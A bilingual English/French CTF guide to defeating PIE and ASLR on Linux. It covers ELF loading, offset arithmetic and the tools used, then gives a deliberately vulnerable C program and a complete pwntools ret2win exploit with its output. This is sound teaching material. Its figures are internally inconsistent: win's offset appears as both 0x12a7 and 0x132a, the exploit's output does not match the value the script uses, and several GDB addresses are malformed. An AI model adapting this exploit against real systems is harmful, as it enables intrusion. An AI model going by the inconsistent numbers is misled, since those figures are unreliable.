# Position Independent Executables (PIE) — Binary Exploitation & CTF Guide
# Exécutables Indépendants de Position (PIE) — Guide d'Exploitation Binaire & CTF

> **EN**: A comprehensive, bilingual reference for understanding, analysing, and exploiting PIE-enabled binaries in Capture-The-Flag competitions.
>
> **FR**: Une référence bilingue complète pour comprendre, analyser et exploiter les binaires PIE dans les compétitions Capture-The-Flag.

---

## Table of Contents / Table des Matières

1. [Introduction](#1-introduction)
2. [Storage and Loading / Stockage et Chargement](#2-storage-and-loading--stockage-et-chargement)
3. [Memory Addresses / Adresses Mémoire](#3-memory-addresses--adresses-mémoire)
4. [Offset Calculations / Calcul des Décalages](#4-offset-calculations--calcul-des-décalages)
5. [Extracting Offsets with Tools / Extraction des Décalages avec les Outils](#5-extracting-offsets-with-tools--extraction-des-décalages-avec-les-outils)
6. [CTF Workflow / Processus CTF](#6-ctf-workflow--processus-ctf)
7. [Comparison Tables / Tableaux Comparatifs](#7-comparison-tables--tableaux-comparatifs)
8. [Quick Reference / Référence Rapide](#8-quick-reference--référence-rapide)

---

## 1. Introduction

### What is a PIE Binary? / Qu'est-ce qu'un binaire PIE ?

**EN**:
A **Position Independent Executable (PIE)** is a binary whose machine code makes no assumptions about the absolute virtual address at which it will be loaded. Every instruction, every function call, and every data reference uses addresses relative to the current instruction pointer (RIP-relative on x86-64). This allows the operating system loader to place the binary at any base address in the virtual address space each time the program is executed.

PIE was introduced to complement **ASLR (Address Space Layout Randomization)**, a kernel-level defence that randomises the base addresses of the stack, heap, shared libraries, and — when PIE is enabled — the executable itself. Without PIE, the executable's `.text` segment always occupies a fixed, predictable address, giving an attacker a stable foothold even when ASLR is active.

**FR**:
Un **Exécutable Indépendant de Position (PIE)** est un binaire dont le code machine ne fait aucune hypothèse sur l'adresse virtuelle absolue à laquelle il sera chargé. Chaque instruction, chaque appel de fonction et chaque référence à des données utilise des adresses relatives au pointeur d'instruction courant (RIP-relatif sur x86-64). Cela permet au chargeur du système d'exploitation de placer le binaire à n'importe quelle adresse de base dans l'espace d'adressage virtuel à chaque exécution du programme.

PIE a été introduit pour compléter **l'ASLR (Address Space Layout Randomization)**, une défense au niveau du noyau qui randomise les adresses de base de la pile, du tas, des bibliothèques partagées et — lorsque PIE est activé — de l'exécutable lui-même. Sans PIE, le segment `.text` de l'exécutable occupe toujours une adresse fixe et prévisible, offrant à l'attaquant un point d'ancrage stable même lorsque l'ASLR est actif.

---

### Why Does PIE Exist? / Pourquoi le PIE existe-t-il ?

**EN**:
| Threat | Mitigation |
|---|---|
| Absolute address hardcoding in exploits (ret2win, ROP chains) | ASLR randomises the load address every run |
| ASLR bypass when executable base is fixed (non-PIE) | PIE randomises the executable base as well |
| Information disclosure via known `.text` addresses | Even leaked addresses only reveal one run's layout |

PIE is compiled with `-fPIE -pie` (GCC/Clang) and is the default on most modern Linux distributions.

**FR**:
| Menace | Atténuation |
|---|---|
| Adresses absolues codées en dur dans les exploits (ret2win, chaînes ROP) | L'ASLR randomise l'adresse de chargement à chaque exécution |
| Contournement d'ASLR quand la base de l'exécutable est fixe (non-PIE) | Le PIE randomise aussi la base de l'exécutable |
| Fuite d'informations via des adresses `.text` connues | Même les adresses divulguées ne révèlent que la disposition d'une seule exécution |

Le PIE est compilé avec `-fPIE -pie` (GCC/Clang) et est la valeur par défaut sur la plupart des distributions Linux modernes.

---

### PIE vs Non-PIE at a Glance / PIE vs Non-PIE en un coup d'œil

**EN**: The two compile commands below illustrate the difference:

**FR**: Les deux commandes de compilation ci-dessous illustrent la différence :

```bash
# Non-PIE (fixed base address ~0x400000)
gcc -no-pie -o vuln vuln.c

# PIE (randomised base address each run)
gcc -pie -fPIE -o vuln vuln.c
```

**EN**: Check whether a binary is PIE with `checksec` or `file`:

**FR**: Vérifiez si un binaire est PIE avec `checksec` ou `file` :

```bash
$ checksec --file=./vuln
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled          # <-- PIE is on

$ file ./vuln
./vuln: ELF 64-bit LSB pie executable, x86-64, ...
#                      ^^^
#                      "pie executable" confirms PIE
```

---

## 2. Storage and Loading / Stockage et Chargement

### On-Disk Format / Format sur Disque

**EN**:
A PIE binary is stored on disk as a **shared object** (ELF type `ET_DYN`) rather than a traditional executable (`ET_EXEC`). All addresses inside the file are expressed as **offsets from the file's base (0x0)**. The linker assigns each symbol a virtual address starting at `0x0000` (or sometimes a small page-aligned value like `0x1000`), purely as a placeholder.

```
ELF Header → e_type = ET_DYN   (shared-object / PIE)
              e_type = ET_EXEC  (non-PIE executable)
```

**FR**:
Un binaire PIE est stocké sur le disque comme un **objet partagé** (type ELF `ET_DYN`) plutôt qu'un exécutable traditionnel (`ET_EXEC`). Toutes les adresses dans le fichier sont exprimées comme des **décalages depuis la base du fichier (0x0)**. L'éditeur de liens attribue à chaque symbole une adresse virtuelle commençant à `0x0000` (ou parfois une petite valeur alignée sur une page comme `0x1000`), uniquement à titre indicatif.

---

### Loading into Memory / Chargement en Mémoire

**EN**:
At runtime, the dynamic linker (`ld-linux.so`) performs the following steps:

1. **Picks a random base address** (e.g. `0x55a3c2100000`) — this is the ASLR contribution for the executable.
2. **Maps each ELF segment** at `base + segment_offset`.
3. **Applies relocations** — patches any absolute-address references inside the binary to reflect the chosen base.
4. **Transfers control** to the entry point at `base + e_entry`.

Every function address the program ever uses is therefore:

```
runtime_addr = pie_base + file_offset
```

**FR**:
À l'exécution, l'éditeur de liens dynamique (`ld-linux.so`) effectue les étapes suivantes :

1. **Choisit une adresse de base aléatoire** (ex : `0x55a3c2100000`) — c'est la contribution de l'ASLR pour l'exécutable.
2. **Mappe chaque segment ELF** à `base + décalage_segment`.
3. **Applique les relocalisations** — corrige les références d'adresse absolue dans le binaire pour refléter la base choisie.
4. **Transfère le contrôle** au point d'entrée à `base + e_entry`.

Chaque adresse de fonction que le programme utilise est donc :

```
adresse_runtime = base_pie + décalage_fichier
```

---

### ASLR Entropy / Entropie de l'ASLR

**EN**:
On a 64-bit Linux system, ASLR typically randomises **28 bits** of the executable base address. This means there are 2²⁸ ≈ 268 million possible base addresses per run — brute-forcing is infeasible. Notice that the **lowest 12 bits (3 hex digits) are always 0x000** because mappings must be page-aligned (page size = 4 KB = 0x1000).

```
Example base addresses across three runs:
  Run 1:  0x55a3c2100000
  Run 2:  0x7f8b04300000
  Run 3:  0x560d11e00000
              ^^^^^^^^
              Changes each time; lowest 3 nibbles always 000
```

**FR**:
Sur un système Linux 64 bits, l'ASLR randomise généralement **28 bits** de l'adresse de base de l'exécutable. Cela signifie qu'il y a 2²⁸ ≈ 268 millions d'adresses de base possibles par exécution — la force brute est infaisable. Notez que les **12 bits les plus bas (3 chiffres hexadécimaux) sont toujours 0x000** car les mappages doivent être alignés sur des pages (taille de page = 4 Ko = 0x1000).

---

## 3. Memory Addresses / Adresses Mémoire

### GDB and Runtime Addresses / GDB et les Adresses Runtime

**EN**:
By default, GDB **disables ASLR** for the process it debugs (via `personality(ADDR_NO_RANDOMIZE)`). This means addresses you see in GDB are **consistent across GDB sessions** but **different from addresses on a remote server** (where ASLR is active).

**FR**:
Par défaut, GDB **désactive l'ASLR** pour le processus qu'il débogue (via `personality(ADDR_NO_RANDOMIZE)`). Cela signifie que les adresses que vous voyez dans GDB sont **cohérentes d'une session GDB à l'autre** mais **différentes des adresses sur un serveur distant** (où l'ASLR est actif).

```bash
# Inside GDB — ASLR disabled, base is deterministic
(gdb) info proc mappings
0x555555554000  0x555555555000  0x1000  0x0  /home/user/vuln
#  ^^^^^^^^^^^^
#  Same every GDB run

# To simulate ASLR inside GDB:
(gdb) set disable-randomization off
(gdb) run
```

---

### Absolute vs Relative Addresses / Adresses Absolues vs Relatives

**EN**:

| Concept | Description | Example |
|---|---|---|
| **File offset** | Address stored in ELF on disk, base = 0x0 | `0x133d` (main), `0x12a7` (win) |
| **PIE base** | Random base chosen by loader at runtime | `0x61c192f75000` |
| **Runtime address** | `pie_base + file_offset` | `0x61c192f7633d` |
| **Relative address** | Difference between two file offsets | `0x12a7 - 0x133d = -0x96` |

**FR**:

| Concept | Description | Exemple |
|---|---|---|
| **Décalage fichier** | Adresse stockée dans l'ELF sur disque, base = 0x0 | `0x133d` (main), `0x12a7` (win) |
| **Base PIE** | Base aléatoire choisie par le chargeur à l'exécution | `0x61c192f75000` |
| **Adresse runtime** | `base_pie + décalage_fichier` | `0x61c192f7633d` |
| **Adresse relative** | Différence entre deux décalages fichier | `0x12a7 - 0x133d = -0x96` |

---

### Why Local and Server Addresses Differ / Pourquoi les Adresses Locales et Distantes Diffèrent

**EN**:
Even if you disable ASLR locally, the **server will have a completely different PIE base** for three reasons:

1. **ASLR is active** on the server — the base is randomised every connection.
2. **Environment variables differ** — the kernel places the stack at a position that depends on the size of the environment block, which shifts all mappings.
3. **Kernel/libc versions differ** — different entropy algorithms or alignment rules can shift the base.

> **Key insight**: You cannot hardcode a runtime address. You must **leak a runtime address** and compute all other addresses from it.

**FR**:
Même si vous désactivez l'ASLR localement, le **serveur aura une base PIE complètement différente** pour trois raisons :

1. **L'ASLR est actif** sur le serveur — la base est randomisée à chaque connexion.
2. **Les variables d'environnement diffèrent** — le noyau place la pile à une position qui dépend de la taille du bloc d'environnement, ce qui décale tous les mappages.
3. **Les versions du noyau/libc diffèrent** — différents algorithmes d'entropie ou règles d'alignement peuvent décaler la base.

> **Idée clé** : Vous ne pouvez pas coder en dur une adresse runtime. Vous devez **faire fuiter une adresse runtime** et calculer toutes les autres adresses à partir de celle-ci.

---

## 4. Offset Calculations / Calcul des Décalages

### The Universal Formula / La Formule Universelle

**EN**:
Because **file offsets are constant** (they never change between runs), the difference between any two file offsets is also constant. We exploit this relationship:

**FR**:
Parce que **les décalages fichier sont constants** (ils ne changent jamais entre les exécutions), la différence entre deux décalages fichier est également constante. Nous exploitons cette relation :

```
delta = offset_target - offset_known

runtime_addr_target = runtime_addr_known + delta
```

Or equivalently / Ou de manière équivalente :

```
addr_target = addr_main + (offset_target - offset_main)
```

---

### Worked Example / Exemple Détaillé

**EN**:
Suppose the binary has two functions: `main` and `win`. We extract their **file offsets** from the binary (static analysis):

**FR**:
Supposons que le binaire ait deux fonctions : `main` et `win`. Nous extrayons leurs **décalages fichier** depuis le binaire (analyse statique) :

```
offset_main = 0x133d
offset_win  = 0x12a7
```

**EN**: We leak the **runtime address of `main`** through a format-string vulnerability or the program printing it:

**FR**: Nous faisons fuiter l'**adresse runtime de `main`** via une vulnérabilité de format de chaîne ou le programme qui l'affiche :

```
runtime_main = 0x61c192f7633d
```

**Step 1 — Compute delta / Étape 1 — Calculer le delta:**

```
delta = offset_win - offset_main
      = 0x12a7 - 0x133d
      = -0x96
```

**Step 2 — Compute runtime address of `win` / Étape 2 — Calculer l'adresse runtime de `win` :**

```
runtime_win = runtime_main + delta
            = 0x61c192f7633d + (-0x96)
            = 0x61c192f7633d - 0x96
            = 0x61c192f762a7
```

**Verification / Vérification:**

```
pie_base    = runtime_main - offset_main
            = 0x61c192f7633d - 0x133d
            = 0x61c192f75000   ← ends in 000 ✓ (page-aligned)

runtime_win = pie_base + offset_win
            = 0x61c192f75000 + 0x12a7
            = 0x61c192f762a7  ✓
```

---

### Python Calculation / Calcul Python

```python
# Static offsets from binary (nm / objdump / readelf)
offset_main = 0x133d
offset_win  = 0x12a7

# Leaked at runtime (e.g. via format string or program output)
runtime_main = int(input("Enter leaked main address (hex): "), 16)

# Compute PIE base and target
pie_base     = runtime_main - offset_main
runtime_win  = pie_base + offset_win

print(f"[*] PIE base    : {hex(pie_base)}")
print(f"[*] runtime_win : {hex(runtime_win)}")
```

---

## 5. Extracting Offsets with Tools / Extraction des Décalages avec les Outils

### `nm` — Symbol Table / Table des Symboles

**EN**: `nm` lists symbols and their **file-relative virtual addresses** (same as offsets when PIE base = 0).

**FR**: `nm` liste les symboles et leurs **adresses virtuelles relatives au fichier** (identiques aux décalages quand la base PIE = 0).

```bash
$ nm ./vuln | grep -E "main|win"
000000000000133d T main
000000000000132a T win

# T = symbol is in the .text (code) section
# Address shown is the file offset (base = 0x0)
```

---

### `readelf` — ELF Section & Symbol Info

**EN**: `readelf` gives raw ELF metadata including symbol tables and section headers.

**FR**: `readelf` fournit les métadonnées ELF brutes, y compris les tables de symboles et les en-têtes de sections.

```bash
# List all symbols with offsets
$ readelf -s ./vuln | grep -E "main|win"
    66: 000000000000133d   203 FUNC    GLOBAL DEFAULT   14 main
    67: 000000000000132a    19 FUNC    GLOBAL DEFAULT   14 win

# Columns: index, file_offset, size, type, binding, visibility, section, name

# Verify ELF type (ET_DYN = PIE)
$ readelf -h ./vuln | grep Type
  Type:                              DYN (Position-Independent Executable file)
```

---

### `objdump` — Disassembly with Offsets / Désassemblage avec Décalages

**EN**: `objdump` disassembles the binary and shows the file offset of every instruction.

**FR**: `objdump` désassemble le binaire et affiche le décalage fichier de chaque instruction.

```bash
$ objdump -d ./vuln | grep -A 20 "<win>:"
000000000000132a <win>:
    132a:  55                   push   rbp
    132b:  48 89 e5             mov    rbp,rsp
    132e:  48 8d 05 cf 0c 00 00 lea    rax,[rip+0xcf]    # "flag.txt"
    1335:  ...
    1339:  e8 f2 fd ff ff       call   1130 <fopen@plt>

# Address on the left (132a) is the file offset — NOT the runtime address
```

---

### `gdb` — Dynamic Inspection / Inspection Dynamique

**EN**: GDB shows **runtime addresses** (with ASLR disabled by default inside GDB).

**FR**: GDB affiche les **adresses runtime** (avec l'ASLR désactivé par défaut à l'intérieur de GDB).

```bash
$ gdb ./vuln
(gdb) break main
(gdb) run
(gdb) p &main
$1 = (<text variable, no debug info> *) 0x555555555133d

(gdb) p &win
$2 = (<text variable, no debug info> *) 0x55555555512a7

# Verify: runtime - offset = base
# 0x555555555133d - 0x133d = 0x555555554000  (GDB default PIE base)
```

---

### Tool Comparison Table / Tableau Comparatif des Outils

**EN** / **FR**:

| Tool / Outil | Type | Shows File Offsets? | Shows Runtime Addrs? | Best For / Meilleur Pour |
|---|---|---|---|---|
| `nm` | Static | ✅ Yes | ❌ No | Quick symbol lookup / Recherche rapide de symboles |
| `readelf` | Static | ✅ Yes | ❌ No | ELF metadata, section headers / Métadonnées ELF |
| `objdump` | Static | ✅ Yes | ❌ No | Disassembly + offsets / Désassemblage + décalages |
| `gdb` | Dynamic | ❌ No* | ✅ Yes | Step-through, register state / Exécution pas-à-pas |
| `pwndbg` / `peda` | Dynamic | ✅ Via `pie` cmd | ✅ Yes | PIE-aware debugging / Débogage PIE |
| `checksec` | Static | ❌ No | ❌ No | Security flags overview / Vue d'ensemble des protections |

> \* `gdb` with PIE: shown addresses are `pie_base + offset`. Use `pie base` in pwndbg to extract the base.

---

## 6. CTF Workflow / Processus CTF

### Scenario / Scénario

**EN**:
A binary called `vuln` is running on a remote server (`challenge.ctf.io:4444`). It has:
- A `main()` function that **prints its own address** (common in beginner PIE challenges).
- A `win()` function that reads and prints `flag.txt` but is **never called** by normal execution.
- A vulnerability that allows you to **redirect execution** to an arbitrary address (e.g. ret2win via buffer overflow).

**FR**:
Un binaire appelé `vuln` tourne sur un serveur distant (`challenge.ctf.io:4444`). Il comporte :
- Une fonction `main()` qui **affiche sa propre adresse** (courant dans les challenges PIE pour débutants).
- Une fonction `win()` qui lit et affiche `flag.txt` mais n'est **jamais appelée** lors d'une exécution normale.
- Une vulnérabilité qui permet de **rediriger l'exécution** vers une adresse arbitraire (ex : ret2win via dépassement de tampon).

---

### Source Code / Code Source

```c
// vuln.c — compiled with: gcc -pie -fPIE -o vuln vuln.c

#include <stdio.h>
#include <stdlib.h>

void win() {
    FILE *f = fopen("flag.txt", "r");
    if (!f) { puts("flag.txt not found"); exit(1); }
    char buf[64];
    fgets(buf, sizeof(buf), f);
    puts(buf);
}

void main() {
    char input[32];
    printf("main is at: %p\n", main);   // <-- leaks runtime address of main
    fflush(stdout);
    gets(input);                          // <-- classic stack overflow
}
```

---

### Step-by-Step Exploit / Exploit Étape par Étape

#### Step 1 — Static Analysis: Extract File Offsets / Étape 1 — Analyse Statique : Extraire les Décalages Fichier

```bash
$ nm ./vuln | grep -E "^[0-9a-f]+ T (main|win)"
000000000000133d T main
000000000000132a T win
```

```python
offset_main = 0x133d
offset_win  = 0x132a
```

---

#### Step 2 — Dynamic Analysis: Confirm Layout in GDB / Étape 2 — Analyse Dynamique : Confirmer la Disposition dans GDB

```bash
$ gdb -q ./vuln
(gdb) run
main is at: 0x555555555133d
^C
(gdb) p win
$1 = {<text variable>} 0x55555555512a7
# delta = 0x12a7 - 0x133d = -0x96  ✓
```

---

#### Step 3 — Find the Offset to Return Address / Étape 3 — Trouver le Décalage jusqu'à l'Adresse de Retour

```bash
# Generate cyclic pattern
$ python3 -c "from pwn import *; print(cyclic(100))" | ./vuln
main is at: 0x555555555133d
Segmentation fault (core dumped)

$ gdb -q ./vuln core
(gdb) info registers rsp
rsp  0x7ffd...
(gdb) x/gx $rsp
0x7ffd...:  0x6161616b61616161   # "kaaaaaaa"
$ python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
40                                # 40 bytes to reach saved RIP
```

---

#### Step 4 — Write the Exploit / Étape 4 — Écrire l'Exploit

```python
#!/usr/bin/env python3
# exploit.py

from pwn import *

# ── Configuration ──────────────────────────────────────────────────────────
BINARY  = "./vuln"
HOST    = "challenge.ctf.io"
PORT    = 4444

# ── Static file offsets (from nm / objdump) ────────────────────────────────
offset_main = 0x133d
offset_win  = 0x132a

# ── Offset to saved RIP (from GDB / cyclic pattern) ───────────────────────
RIP_OFFSET  = 40

# ── Connect ────────────────────────────────────────────────────────────────
io = remote(HOST, PORT)                     # swap to process(BINARY) for local

# ── Step 1: Receive and parse the leaked main address ─────────────────────
line = io.recvline()                        # b"main is at: 0x61c192f7633d\n"
leak = int(line.split(b": ")[1], 16)
log.success(f"Leaked main  : {hex(leak)}")

# ── Step 2: Compute addresses ──────────────────────────────────────────────
pie_base    = leak - offset_main
runtime_win = pie_base + offset_win
log.success(f"PIE base     : {hex(pie_base)}")
log.success(f"win() addr   : {hex(runtime_win)}")

# ── Step 3: Build and send payload ────────────────────────────────────────
payload  = b"A" * RIP_OFFSET               # pad to saved RIP
payload += p64(runtime_win)                # overwrite RIP with win()
io.sendline(payload)

# ── Step 4: Receive flag ───────────────────────────────────────────────────
io.interactive()
```

---

#### Step 5 — Run and Capture the Flag / Étape 5 — Exécuter et Capturer le Flag

```bash
$ python3 exploit.py
[+] Opening connection to challenge.ctf.io on port 4444: Done
[+] Leaked main  : 0x61c192f7633d
[+] PIE base     : 0x61c192f75000
[+] win() addr   : 0x61c192f762a7
[*] Switching to interactive mode
CTF{p13_byp4ss_m4st3r_0ffset_w1zard}
```

---

### Exploit Flow Diagram / Diagramme du Flux d'Exploit

**EN** / **FR**:

```
┌─────────────────────────────────────────────────────────────────┐
│                     EXPLOIT FLOW / FLUX D'EXPLOIT               │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  [Binary on disk]  ──nm/readelf──►  offset_main = 0x133d        │
│                                     offset_win  = 0x12a7         │
│                                                                   │
│  [Remote server]   ──connect──────► "main is at: 0x61c192f7633d"│
│                                              │                    │
│                                              ▼                    │
│                    pie_base = leak - offset_main                  │
│                             = 0x61c192f7633d - 0x133d            │
│                             = 0x61c192f75000                     │
│                                              │                    │
│                                              ▼                    │
│                    runtime_win = pie_base + offset_win            │
│                               = 0x61c192f75000 + 0x12a7          │
│                               = 0x61c192f762a7                   │
│                                              │                    │
│  [Payload]  = "A"*40 + p64(runtime_win)     │                    │
│                    ──sendline──────────────► │                    │
│                                              ▼                    │
│                    [server executes win()]  ──► FLAG!             │
└─────────────────────────────────────────────────────────────────┘
```

---

## 7. Comparison Tables / Tableaux Comparatifs

### PIE vs Non-PIE

**EN** / **FR**:

| Property / Propriété | Non-PIE | PIE |
|---|---|---|
| **ELF type** | `ET_EXEC` | `ET_DYN` |
| **Executable base** | Fixed (e.g. `0x400000`) / Fixe | Random each run / Aléatoire à chaque exécution |
| **Code addresses** | Absolute, stable / Absolues, stables | Base-relative, change each run / Relatives à la base, changent à chaque exécution |
| **ASLR coverage** | Heap, stack, libs only / Tas, pile, libs seulement | Heap, stack, libs **+ executable** / Tas, pile, libs **+ exécutable** |
| **Exploit difficulty** | Lower (addresses predictable) / Plus faible | Higher (need address leak) / Plus élevée |
| **Compiled with** | `gcc -no-pie` | `gcc -pie -fPIE` |
| **Default on modern Linux** | ❌ No | ✅ Yes |
| **Ret2win feasibility** | Direct (hardcode address) / Direct | Requires leak / Nécessite une fuite |
| **ROP chain construction** | Static gadget addresses / Adresses gadgets statiques | Gadget addresses = base + offset / = base + décalage |
| **`checksec` output** | `PIE: No PIE` | `PIE: PIE enabled` |

---

### Tool Comparison (Deep) / Comparaison Approfondie des Outils

**EN** / **FR**:

| Tool / Outil | Analysis Type | Input | Key Output / Sortie Clé | PIE-Aware? | Typical Use / Usage Typique |
|---|---|---|---|---|---|
| `nm` | Static | Binary | Symbol names + file offsets / Noms + décalages | ✅ Offsets only | `nm binary \| grep win` |
| `readelf -s` | Static | Binary | Full symbol table with sizes / Table complète avec tailles | ✅ Offsets only | Section & dynamic symbol info |
| `objdump -d` | Static | Binary | Disassembly at file offsets / Désassemblage aux décalages fichier | ✅ Offsets only | Instruction-level analysis |
| `gdb` | Dynamic | Process | Runtime addresses (ASLR off by default) / Adresses runtime | ✅ Runtime | Step-through debugging |
| `pwndbg` | Dynamic | Process | `pie base`, `vmmap`, breakpoints at offsets | ✅ Both | CTF debugging, PIE analysis |
| `strace` | Dynamic | Process | Syscall trace with addresses / Trace syscall avec adresses | ❌ No | Library call tracing |
| `checksec` | Static | Binary | Security flags summary / Résumé des protections | ❌ No | Quick security assessment |
| `pwntools` | Dynamic | Script | Scripted interaction + address arithmetic | ✅ Both | Exploit scripting |

---

## 8. Quick Reference / Référence Rapide

### Cheat Sheet

**EN** / **FR**:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  PIE EXPLOIT CHEAT SHEET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  CONCEPT                    FORMULA
  ─────────────────────────  ──────────────────────────────────
  File offset                nm/readelf/objdump output (base=0)
  Runtime address            pie_base + file_offset
  PIE base                   runtime_addr - file_offset
  Target addr (from leak)    leak + (offset_target - offset_src)
  Delta between functions    offset_b - offset_a  (constant!)

  KEY INVARIANT:  lowest 3 hex digits of pie_base == 000
                  (page alignment = 0x1000 = 4096 bytes)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  COMMON COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  # Check PIE
  checksec --file=./binary
  file ./binary | grep -o "pie executable"

  # Get function offsets
  nm ./binary | grep " T "
  readelf -s ./binary | grep FUNC
  objdump -d ./binary | grep "<funcname>:"

  # GDB: get runtime addresses
  gdb ./binary
  (gdb) p &function_name
  (gdb) info proc mappings      # shows pie_base

  # pwndbg: PIE base
  (gdb) pie base

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  PWNTOOLS SNIPPET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  from pwn import *

  elf          = ELF("./binary")          # auto-loads offsets
  offset_main  = elf.symbols["main"]      # file offset
  offset_win   = elf.symbols["win"]       # file offset

  leak         = <received_from_server>
  elf.address  = leak - offset_main       # sets pie_base
  runtime_win  = elf.symbols["win"]       # now returns runtime addr

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

### Common Pitfalls / Erreurs Courantes

**EN**:
1. **Forgetting that GDB disables ASLR** — addresses in GDB ≠ addresses on server.
2. **Using runtime addresses as file offsets** — always subtract the PIE base first.
3. **Off-by-one in RIP offset** — use `cyclic` / `pattern_create` to find exact padding.
4. **Not flushing the leak** — if the program doesn't call `fflush`, the address may not arrive before you send the payload. Use `io.recvuntil("0x")`.
5. **Misreading `nm` for stripped binaries** — use `readelf -s` or `objdump` on stripped files; `nm` may show nothing.

**FR**:
1. **Oublier que GDB désactive l'ASLR** — les adresses dans GDB ≠ les adresses sur le serveur.
2. **Utiliser des adresses runtime comme décalages fichier** — soustrayez toujours la base PIE d'abord.
3. **Erreur de un dans le décalage RIP** — utilisez `cyclic` / `pattern_create` pour trouver le rembourrage exact.
4. **Ne pas vider le tampon de la fuite** — si le programme n'appelle pas `fflush`, l'adresse peut ne pas arriver avant que vous envoyiez le payload. Utilisez `io.recvuntil("0x")`.
5. **Mauvaise lecture de `nm` pour les binaires strippés** — utilisez `readelf -s` ou `objdump` sur les fichiers strippés ; `nm` peut ne rien afficher.

---

### pwntools ELF Helper / Aide ELF pwntools

**EN**: pwntools' `ELF` class automates all offset lookups:

**FR**: La classe `ELF` de pwntools automatise toutes les recherches de décalages :

```python
from pwn import *

elf = ELF("./vuln")

# Access file offsets (before setting elf.address)
print(hex(elf.symbols["main"]))    # 0x133d
print(hex(elf.symbols["win"]))     # 0x12a7

# After receiving leak, update the base:
elf.address = leaked_main - elf.symbols["main"]

# Now symbols return runtime addresses automatically:
print(hex(elf.symbols["win"]))     # 0x61c192f762a7  ← runtime!
print(hex(elf.plt["printf"]))      # runtime PLT address
print(hex(elf.got["printf"]))      # runtime GOT address
```

---

*Document version 1.0 — Compiled for CTF practitioners and binary exploitation students.*
*Version du document 1.0 — Compilé pour les pratiquants CTF et les étudiants en exploitation binaire.*
